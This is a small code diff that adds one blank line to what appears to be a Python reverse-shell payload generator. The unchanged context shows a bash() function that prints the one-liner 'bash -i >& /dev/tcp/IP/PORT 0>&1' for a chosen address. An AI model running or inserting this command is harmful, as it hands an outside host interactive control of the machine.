@@ -17,6 +17,7 @@ for i in banner:
     print(i,end='')
     sys.stdout.flush()
     sleep(0.03)
+    
 def bash():
     print(Fore.GREEN + "\nbash -i >& /dev/tcp/"+ip+"/"+port +" 0>&1")
     main_menu()
